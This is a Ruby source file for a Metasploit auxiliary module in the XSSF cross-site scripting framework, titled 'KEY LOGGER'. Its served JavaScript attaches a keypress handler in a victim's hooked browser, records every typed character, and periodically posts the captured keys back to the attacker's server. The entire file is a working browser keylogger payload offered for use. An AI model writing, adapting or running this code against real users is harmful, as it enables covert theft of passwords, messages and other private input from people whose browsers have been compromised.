require 'msf/core'
require 'msf/base/xssf'

#
# READ README_XSSF FILE FOR MORE INFORMATION ABOUT MODULES
#
class Metasploit3 < Msf::Auxiliary
	include Msf::Xssf::XssfServer
	
	# Module initialization
	def initialize(info = {})
		super(update_info(info,
			'Name'        => 'KEY LOGGER',
			'Description' => 'Retrieve all keys tiped by the victim since attack started'
		))
		
		register_options(
			[
				OptInt.new('Interval', [true, 'Interval to send keys to server in seconds', 10])
			], self.class
		)
	end
	
	# Part sent to the victim, insert your code here !!!
	def on_request_uri(cli, req)
		code = %Q{
			var keys = '';
			
			window.document.onkeypress = logKey;
			function logKey(e) {
				if(window.event) keys += String.fromCharCode(event.keyCode);	// IE
				else if(e.which) keys += String.fromCharCode(e.which);			// Netscape/Firefox/Opera 
			}
			
			function sendKeys() {
				if (keys != '') {
					XSSF_POST("KEY LOG : " + keys, '#{self.name}');
					keys = '';
				}
			}
			setInterval(sendKeys, #{datastore['Interval'].to_i} * 1000);
		}
		
		send_response(cli, code, {'Content-Type' => 'text/html'} )
	end
end